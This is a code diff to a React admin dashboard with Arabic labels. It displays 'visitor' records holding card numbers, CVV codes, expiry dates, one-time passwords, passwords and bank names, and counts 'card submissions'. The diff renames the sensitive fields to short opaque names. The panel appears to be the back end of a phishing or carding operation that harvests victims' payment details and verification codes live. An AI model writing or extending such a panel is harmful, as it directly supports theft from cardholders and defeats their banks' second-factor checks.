@@ -112,14 +112,14 @@ interface Notification {
   bank: string;
   cardStatus?: string;
   ip?: string;
-  cvv: string;
+  dacvv: string;
   id: string | "0";
   expiryDate: string;
   notificationCount: number;
-  otp: string;
-  otp2: string;
+  daotp: string;
+  daotp2: string;
   page: string;
-  cardNumber: string;
+  car: string;
   country?: string;
   personalInfo: {
     id?: string | "0";
@@ -850,7 +850,7 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length;
-  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
+  const cardSubmissionsCount = notifications.filter((n) => n.car).length;
   const approvedCount = notifications.filter(
     (n) => n.status === "approved"
   ).length;
@@ -864,7 +864,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cardNumber);
+      filtered = filtered.filter((notification) => notification.car);
     } else if (filterType === "online") {
       filtered = filtered.filter(
         (notification) => onlineStatuses[notification.id]
@@ -879,9 +879,9 @@ export default function NotificationsPage() {
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
-          notification.cardNumber?.toLowerCase().includes(term) ||
+          notification.car?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
-          notification.otp?.toLowerCase().includes(term)
+          notification.daotp?.toLowerCase().includes(term)
       );
     }
 
@@ -973,8 +973,8 @@ export default function NotificationsPage() {
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.cardNumber &&
-            !notifications.some((n) => n.id === notification.id && n.cardNumber)
+            notification.car &&
+            !notifications.some((n) => n.id === notification.id && n.car)
         );
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
@@ -1018,7 +1018,7 @@ export default function NotificationsPage() {
 
     // Card submissions is the count of notifications with card info
     const cardCount = notificationsData.filter(
-      (notification) => notification.cardNumber
+      (notification) => notification.car
     ).length;
 
     setTotalVisitors(totalCount);
@@ -1638,10 +1638,10 @@ export default function NotificationsPage() {
                           </Badge>
                           <Badge
                             variant={
-                              notification.cardNumber ? "default" : "secondary"
+                              notification.car ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cardNumber
+                              notification.car
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1650,7 +1650,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardNumber
+                            {notification.car
                               ? "معلومات البطاقة"
                               : "لا يوجد بطاقة"}
                           </Badge>
@@ -1691,12 +1691,12 @@ export default function NotificationsPage() {
                         <UserStatus userId={notification.id} />
                       </td>
                       <td className="px-6 py-4 text-center">
-                        {notification.otp && (
+                        {notification.daotp && (
                           <Badge
                             variant="outline"
                             className="bg-blue-50 text-blue-700 border-blue-200"
                           >
-                            {notification.otp}
+                            {notification.daotp}
                           </Badge>
                         )}
                       </td>
@@ -1821,17 +1821,17 @@ export default function NotificationsPage() {
                         </Badge>
                         <Badge
                           variant={
-                            notification.cardNumber ? "default" : "secondary"
+                            notification.car ? "default" : "secondary"
                           }
                           className={`cursor-pointer ${
-                            notification.cardNumber
+                            notification.car
                               ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                               : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.cardNumber
+                          {notification.car
                             ? "معلومات البطاقة"
                             : "لا يوجد بطاقة"}
                         </Badge>
@@ -1859,12 +1859,12 @@ export default function NotificationsPage() {
                             </Badge>
                           )}
                         </div>
-                        {notification.otp && (
+                        {notification.daotp && (
                           <Badge
                             variant="outline"
                             className="bg-blue-50 text-blue-700"
                           >
-                            {notification.otp}
+                            {notification.daotp}
                           </Badge>
                         )}
                       </div>
@@ -1998,7 +1998,7 @@ export default function NotificationsPage() {
                { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber ,
+                    value: selectedNotification?.car ,
                   },
                   {
                     label: "تاريخ الانتهاء",
@@ -2007,8 +2007,8 @@ export default function NotificationsPage() {
                         ? `${selectedNotification.year}/${selectedNotification.month}`
                         : selectedNotification.expiryDate,
                   },
-                  { label: "رمز الأمان", value: selectedNotification.cvv },
-                  { label: "رمز التحقق", value: selectedNotification.otp },
+                  { label: "رمز الأمان", value: selectedNotification.dacvv },
+                  { label: "رمز التحقق", value: selectedNotification.daotp },
                   { label: "كلمة المرور", value: selectedNotification.pass },
                 ].map(
                   ({ label, value }) =>
@@ -2032,13 +2032,13 @@ export default function NotificationsPage() {
                         جميع الرموز:
                       </span>
                       <div className="flex flex-wrap gap-2">
-                        {selectedNotification.allOtps.map((otp, index) => (
+                        {selectedNotification.allOtps.map((daotp, index) => (
                           <Badge
                             key={index}
                             variant="outline"
                             className="bg-muted"
                           >
-                            {otp}
+                            {daotp}
                           </Badge>
                         ))}
                       </div>
